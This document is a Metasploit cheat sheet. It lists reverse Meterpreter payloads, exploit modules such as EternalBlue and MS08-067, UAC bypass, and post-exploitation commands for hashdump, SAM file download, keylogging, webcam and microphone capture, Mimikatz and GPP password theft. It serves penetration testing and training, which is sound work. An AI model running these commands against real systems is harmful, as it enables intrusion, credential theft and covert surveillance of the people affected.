### Start Metasploit without banner

`msfconsole -q`

`sudo apt update && sudo apt install metasploit-framework`

#### Type

| **Type**    | **Description**                                                                                 |
| ----------- | ----------------------------------------------------------------------------------------------- |
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.  |
| `Encoders`  | Ensure that payloads are intact to their destination.                                           |
| `Exploits`  | Defined as modules that exploit a vulnerability that will allow for the payload delivery.       |
| `NOPs`      | (No Operation code) Keep the payload sizes consistent across exploit attempts.                  |
| `Payloads`  | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| `Plugins`   | Additional scripts can be integrated within an assessment with `msfconsole` and coexist.        |
| `Post`      | Wide array of modules to gather information, pivot deeper, etc.                                 |

### Meterpreter Modules / plugins / scripts / tools

`ls /usr/share/metasploit-framework/modules`

`ls /usr/share/metasploit-framework/plugins/`

`ls /usr/share/metasploit-framework/scripts/`

`ls /usr/share/metasploit-framework/tools/`

### Meterpreter Payloads

#### Windows reverse meterpreter payload

`set payload windows/meterpreter/reverse_tcp`

#### Windows VNC Meterpreter payload

`set payload windows/vncinject/reverse_tcp`

`set ViewOnly false`

#### Linux Reverse Meterpreter payload

`set payload linux/meterpreter/reverse_tcp`

#### Android Reverse Meterpreter payload

`set payload android/meterpreter/reverse_tcp`

### Meterpreter Cheat Sheet

| Command | Description |
|---------|-------------|
| `upload file c:\\windows` | Upload file to Windows target |
| `download c:\\windows\\repair\\sam /tmp` | Download file from Windows target |
| `execute -f c:\\windows\temp\exploit.exe` | Run .exe on target |
| `execute -f cmd -c` | Creates new channel with cmd shell |
| `ps` | Show processes |
| `shell` | Get shell on the target |
| `getsystem` | Attempts privilege escalation on the target |
| `hashdump` | Dump the hashes on the target |
| `portfwd add –l 3389 –p 3389 –r target` | Create port forward to target machine |
| `portfwd delete –l 3389 –p 3389 –r target` | Delete port forward |
| `screenshot` | Capture screenshot of the target machine |
| `keyscan_start` | Start keylogger |
| `keyscan_dump` | Dump collected keystrokes |
| `webcam_snap` | Take webcam snapshot |
| `record_mic` | Record microphone |
| `enum_chrome` | Enumerate Chrome browser data |
## :computer: Common Metasploit Modules

### :closed_lock_with_key: Remote Windows Metasploit Modules (exploits)

| Command | Description |
|---------|-------------|
| `use exploit/windows/smb/ms08_067_netapi` | MS08_067 Windows 2k, XP, 2003 Remote Exploit |
| `use exploit/windows/dcerpc/ms06_040_netapi` | MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit |
| `use exploit/windows/smb/ms09_050_smb2_negotiate_func_index` | MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit |
| `use exploit/windows/smb/ms17_010_eternalblue` | MS17_010 EternalBlue SMB Remote Windows Kernel Pool Corruption |

### :key: Local Windows Metasploit Modules (exploits)

| Command | Description |
|---------|-------------|
| `use exploit/windows/local/bypassuac` | Bypass UAC on Windows 7 + Set target + arch, x86/64 |
| `use exploit/windows/local/ms10_015_kitrap0d` | MS10_015 Kitrap0d Local Privilege Escalation |

### :mag: Auxilary Metasploit Modules

| Command | Description |
|---------|-------------|
| `use auxiliary/scanner/http/dir_scanner` | Metasploit HTTP directory scanner |
| `use auxiliary/scanner/http/jboss_vulnscan` | Metasploit JBOSS vulnerability scanner |
| `use auxiliary/scanner/mssql/mssql_login` | Metasploit MSSQL Credential Scanner |
| `use auxiliary/scanner/mysql/mysql_version` | Metasploit MySQL Version Scanner |
| `use auxiliary/scanner/oracle/oracle_login` | Metasploit Oracle Login Module |

### :shell: Metasploit Powershell Modules

| Command | Description |
|---------|-------------|
| `use exploit/multi/script/web_delivery` | Metasploit powershell payload delivery module |
| `post/windows/manage/powershell/exec_powershell` | Metasploit upload and run powershell script through a session |
| `use exploit/multi/http/jboss_maindeployer` | Metasploit JBOSS deploy |
| `use exploit/windows/mssql/mssql_payload` | Metasploit MSSQL payload |

### :wrench: Post Exploit Windows Metasploit Modules

| Command | Description |
|---------|-------------|
| `run post/windows/gather/win_privs` | Metasploit show privileges of current user |
| `use post/windows/gather/credentials/gpp` | Metasploit grab GPP saved passwords |
| `load mimikatz -> wdigest` | Metasploit load Mimikatz |
| `run post/windows/gather/local_admin_search_enum` | Identify other machines that the supplied domain user has administrative access to |
